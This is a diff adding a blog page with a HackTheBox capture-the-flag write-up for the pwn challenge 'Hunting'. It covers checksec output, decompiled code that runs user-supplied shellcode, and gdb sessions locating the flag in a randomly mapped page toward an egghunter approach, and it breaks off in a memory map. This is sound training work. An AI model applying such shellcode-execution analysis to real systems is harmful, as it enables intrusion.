@@ -1,0 +1,701 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>HackTheBox Pwn: Hunting &middot; Congo</title>
+    <meta name="title" content="HackTheBox Pwn: Hunting &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        {% img /img/htb.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/hunting/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/hunting/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="HackTheBox Pwn: Hunting">
+  <meta property="og:description" content="{% img /img/htb.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2021-02-13T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-02-13T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HackTheBox Pwn: Hunting">
+<meta name="twitter:description" content="{% img /img/htb.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "HackTheBox Pwn: Hunting",
+    "headline": "HackTheBox Pwn: Hunting",
+    
+    "abstract": "{% img \/img\/htb.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/hunting\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2021",
+    "dateCreated": "2021-02-13T00:00:00\u002b00:00",
+    "datePublished": "2021-02-13T00:00:00\u002b00:00",
+    
+    "dateModified": "2021-02-13T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1664"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox Pwn: Hunting
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2021-02-13 00:00:00 &#43;0000 UTC">13 February 2021</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>{% img /img/htb.png %}</p>
+<p>This challenge was quite good, as someone who never really did egghunting shellcode, this was a good learning experience. So, the binary given s pretty simple, all the protections have been disabled except the PIE but, analysing the workflow, we can see that it reads shellcode and then execute that shellcode.</p>
+<!-- more -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">4</span><span class="nl">mianwayne@oracle:</span><span class="err">~/</span><span class="nf">Pwning</span><span class="err">/</span><span class="no">HackTheBox$</span> <span class="no">checksec</span> <span class="no">hunting</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">hunting</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">i386-32-little</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">disabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RWX:</span>      <span class="nf">Has</span> <span class="no">RWX</span> <span class="no">segments</span>
+</span></span></code></pre></div><h1 id="reverse-engineering" class="relative group">Reverse Engineering <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reverse-engineering" aria-label="Anchor">#</a></span></h1><p>In the binary itself, the <code>main</code> functions seems to be doing</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">int</span> <span class="no">sub_1374</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="err">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">void</span> <span class="p">*</span><span class="no">addr</span><span class="c1">; // ST2C_4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">void</span> <span class="p">*</span><span class="no">buf</span><span class="c1">; // ST24_4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">v3</span><span class="c1">; // [esp-10h] [ebp-24h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">v4</span><span class="c1">; // [esp-Ch] [ebp-20h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">v5</span><span class="c1">; // [esp-8h] [ebp-1Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">v6</span><span class="c1">; // [esp-4h] [ebp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">char</span> <span class="p">*</span><span class="no">dest</span><span class="c1">; // [esp+4h] [ebp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">addr</span> <span class="err">=</span> <span class="p">(</span><span class="no">void</span> <span class="p">*)</span><span class="no">sub_12E8</span><span class="p">()</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">signal</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="p">(</span><span class="no">__sighandler_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">exit</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">alarm</span><span class="p">(</span><span class="mi">3</span><span class="no">u</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">dest</span> <span class="err">=</span> <span class="p">(</span><span class="no">char</span> <span class="p">*)</span><span class="no">mmap</span><span class="p">(</span><span class="no">addr</span><span class="p">,</span> <span class="mi">0x1000u</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="p">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">if</span> <span class="p">(</span> <span class="no">dest</span> <span class="err">==</span> <span class="p">(</span><span class="no">char</span> <span class="p">*)-</span><span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">sub_1118</span><span class="p">(-</span><span class="mi">1</span><span class="p">,</span> <span class="no">v3</span><span class="p">,</span> <span class="no">v4</span><span class="p">,</span> <span class="no">v5</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">strcpy</span><span class="p">(</span><span class="no">dest</span><span class="p">,</span> <span class="no">aHtbXxxxxxxxxxx</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">memset</span><span class="p">(</span><span class="no">aHtbXxxxxxxxxxx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0x25u</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">sub_1259</span><span class="p">()</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">buf</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">0x3Cu</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="no">buf</span><span class="p">,</span> <span class="mi">0x3Cu</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">((</span><span class="nf">void</span> <span class="p">(</span><span class="no">__stdcall</span> <span class="p">*)(</span><span class="no">int</span><span class="p">,</span> <span class="no">void</span> <span class="p">*,</span> <span class="no">_DWORD</span><span class="p">))</span><span class="no">buf</span><span class="p">)(</span><span class="no">v6</span><span class="p">,</span> <span class="no">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">return</span> <span class="mi">0</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">}</span>
+</span></span></code></pre></div><p>Here, if gets the address from the following function:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">int</span> <span class="no">sub_12E8</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="err">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">unsigned</span> <span class="no">int</span> <span class="no">buf</span><span class="c1">; // [esp+0h] [ebp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">fd</span><span class="c1">; // [esp+8h] [ebp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">i</span><span class="c1">; // [esp+Ch] [ebp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fd</span> <span class="err">=</span> <span class="no">open</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">dev</span><span class="err">/</span><span class="no">urandom</span><span class="err">&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">read</span><span class="p">(</span><span class="no">fd</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">buf</span><span class="p">,</span> <span class="mi">8</span><span class="no">u</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">close</span><span class="p">(</span><span class="no">fd</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">srand</span><span class="p">(</span><span class="no">buf</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">for</span> <span class="p">(</span> <span class="no">i</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">; i &lt;= 1610612735 || (unsigned int)i &gt; 0xF7000000; i = rand() &lt;&lt; 16 )
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">return</span> <span class="no">i</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">}</span>
+</span></span></code></pre></div><p>This one seems to setting the seed of the random taken from the <code>/dev/urandom</code> and then calling the <code>rand()</code> a large number of times and returns it after certain number of iterations, so this is unpredictably random.</p>
+<p>Then after getting a random address, it calls <code>mmap</code> to allocate a memory pointed by the randomized address, then copies the flag string to that region, after that it reads <code>0x30</code> bytes from the stdin and calls the given input, hence it is reading a shellcode which will be called later on. It also makes the memmory <code>0</code> pointed by the flag before calling the <code>read</code>, things got a bit more complicated here but we have shellcode execution :)</p>
+<h1 id="initial-idea" class="relative group">Initial Idea <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initial-idea" aria-label="Anchor">#</a></span></h1><p>Running it in <code>gdb</code>, we can see:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">hunting</span> 
+</span></span><span class="line"><span class="cl"><span class="no">AAAAAAAAAAAAAAAAAAA</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">Program</span> <span class="no">received</span> <span class="no">signal</span> <span class="no">SIGSEGV</span><span class="p">,</span> <span class="no">Segmentation</span> <span class="no">fault.</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x5657c000</span> <span class="no">in</span> <span class="err">??</span> <span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="na">..snip..</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">registers</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0x5655a194</span>  <span class="err">→</span>  <span class="mi">0x00000084</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$ebx</span>   <span class="p">:</span> <span class="mi">0x56559000</span>  <span class="err">→</span>   <span class="no">clc</span> 
+</span></span><span class="line"><span class="cl"><span class="no">$ecx</span>   <span class="p">:</span> <span class="mi">0x5655a1b3</span>  <span class="err">→</span>  <span class="mi">0x000000ab</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$edx</span>   <span class="p">:</span> <span class="mi">0x3c</span>      
+</span></span><span class="line"><span class="cl"><span class="no">$esp</span>   <span class="p">:</span> <span class="mi">0xffffd008</span>  <span class="err">→</span>  <span class="mi">0x0000002b</span> <span class="p">(</span><span class="err">&#34;+&#34;?</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$ebp</span>   <span class="p">:</span> <span class="mi">0xffffd028</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$esi</span>   <span class="p">:</span> <span class="mi">0xf7fae000</span>  <span class="err">→</span>  <span class="mi">0x001ead6c</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$edi</span>   <span class="p">:</span> <span class="mi">0xf7fae000</span>  <span class="err">→</span>  <span class="mi">0x001ead6c</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$eip</span>   <span class="p">:</span> <span class="mi">0x5657c000</span>
+</span></span><span class="line"><span class="cl"><span class="nl">$eflags:</span> <span class="err">[</span><span class="nf">zero</span> <span class="no">CARRY</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">SIGN</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">RESUME</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">$cs:</span> <span class="err">0</span><span class="nf">x0023</span> <span class="no">$ss</span><span class="p">:</span> <span class="mi">0x002b</span> <span class="no">$ds</span><span class="p">:</span> <span class="mi">0x002b</span> <span class="no">$es</span><span class="p">:</span> <span class="mi">0x002b</span> <span class="no">$fs</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$gs</span><span class="p">:</span> <span class="mi">0x0063</span> 
+</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="no">stack</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffd008</span><span class="err">│+</span><span class="mi">0x0000</span><span class="p">:</span> <span class="mi">0x0000002b</span> <span class="p">(</span><span class="err">&#34;+&#34;?</span><span class="p">)</span>	 <span class="err">←</span> <span class="no">$esp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffd00c</span><span class="err">│+</span><span class="mi">0x0004</span><span class="p">:</span> <span class="mi">0x5655644f</span>  <span class="err">→</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffd010</span><span class="err">│+</span><span class="mi">0x0008</span><span class="p">:</span> <span class="mi">0x00000001</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffd014</span><span class="err">│+</span><span class="mi">0x000c</span><span class="p">:</span> <span class="mi">0x5655a1a0</span>  <span class="err">→</span>  <span class="mi">0x41414141</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffd018</span><span class="err">│+</span><span class="mi">0x0010</span><span class="p">:</span> <span class="mi">0x00000000</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffd01c</span><span class="err">│+</span><span class="mi">0x0014</span><span class="p">:</span> <span class="mi">0x00000000</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffd020</span><span class="err">│+</span><span class="mi">0x0018</span><span class="p">:</span> <span class="mi">0xffffd040</span>  <span class="err">→</span>  <span class="mi">0x00000001</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffd024</span><span class="err">│+</span><span class="mi">0x001c</span><span class="p">:</span> <span class="mi">0x00000000</span>
+</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nl">code:x86:</span><span class="err">32</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">[!]</span> <span class="nf">Cannot</span> <span class="no">disassemble</span> <span class="no">from</span> <span class="no">$PC</span>
+</span></span><span class="line"><span class="cl"><span class="err">[!]</span> <span class="nf">Cannot</span> <span class="no">access</span> <span class="no">memory</span> <span class="no">at</span> <span class="no">address</span> <span class="mi">0x5657c000</span>
+</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">threads</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] Id 1, Name: &#34;hunting&#34;, stopped 0x5657c000 in ?? (), reason: SIGSEGV
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">trace</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
+</span></span></code></pre></div><p>After fiddling around much, and examing the memory sections, we can see the flag is loaded into the <code>mmap</code>&rsquo;d page:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">search-pattern</span> <span class="no">HTB</span><span class="err">{</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">HTB</span><span class="err">{&#39;</span> <span class="no">in</span> <span class="no">memory</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">In</span> <span class="err">&#39;/</span><span class="no">dev</span><span class="err">/</span><span class="no">zero</span> <span class="p">(</span><span class="no">deleted</span><span class="p">)</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x74b90000</span><span class="p">-</span><span class="mi">0x74b91000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rwx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">0</span><span class="nf">x74b90000</span> <span class="p">-</span> <span class="mi">0x74b90024</span>  <span class="err">→</span>   <span class="err">&#34;</span><span class="no">HTB</span><span class="err">{</span><span class="no">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span class="err">}&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  <span class="no">vmmap</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span>  <span class="nf">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Start</span>      <span class="no">End</span>        <span class="no">Offset</span>     <span class="no">Perm</span> <span class="no">Path</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x56555000</span> <span class="mi">0x56558000</span> <span class="mi">0x00000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">hunting</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x56558000</span> <span class="mi">0x56559000</span> <span class="mi">0x00002000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">hunting</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x56559000</span> <span class="mi">0x5655a000</span> <span class="mi">0x00003000</span> <span class="no">rwx</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">hunting</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x5655a000</span> <span class="mi">0x5657c000</span> <span class="mi">0x00000000</span> <span class="no">rwx</span> <span class="p">[</span><span class="no">heap</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x74b90000</span> <span class="mi">0x74b91000</span> <span class="mi">0x00000000</span> <span class="no">rwx</span> <span class="err">/</span><span class="no">dev</span><span class="err">/</span><span class="no">zero</span> <span class="p">(</span><span class="no">deleted</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xf7dc3000</span> <span class="mi">0xf7fab000</span> <span class="mi">0x00000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">i386-linux-gnu</span><span class="err">/</span><span class="no">libc-2.31.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xf7fab000</span> <span class="mi">0xf7fac000</span> <span class="mi">0x001e8000</span> <span class="p">---</span> <span class="err">/</span><span class="no">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">i386-linux-gnu</span><span class="err">/</span><span class="no">libc-2.31.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xf7fac000</span> <span class="mi">0xf7fae000</span> <span class="mi">0x001e8000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">i386-linux-gnu</span><span class="err">/</span><span class="no">libc-2.31.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xf7fae000</span> <span class="mi">0xf7fb0000</span> <span class="mi">0x001ea000</span> <span class="no">rwx</span> <span class="err">/</span><span class="no">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">i386-linux-gnu</span><span class="err">/</span><span class="no">libc-2.31.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xf7fb0000</span> <span class="mi">0xf7fb2000</span> <span class="mi">0x00000000</span> <span class="no">rwx</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">0xf7fcb000</span> <span class="mi">0xf7fcd000</span> <span class="mi">0x00000000</span> <span class="no">rwx</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">0xf7fcd000</span> <span class="mi">0xf7fd0000</span> <span class="mi">0x00000000</span> <span class="no">r--</span> <span class="p">[</span><span class="no">vvar</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xf7fd0000</span> <span class="mi">0xf7fd1000</span> <span class="mi">0x00000000</span> <span class="no">r-x</span> <span class="p">[</span><span class="no">vdso</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xf7fd1000</span> <span class="mi">0xf7ffb000</span> <span class="mi">0x00000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">i386-linux-gnu</span><span class="err">/</span><span class="no">ld-2.31.so</span>
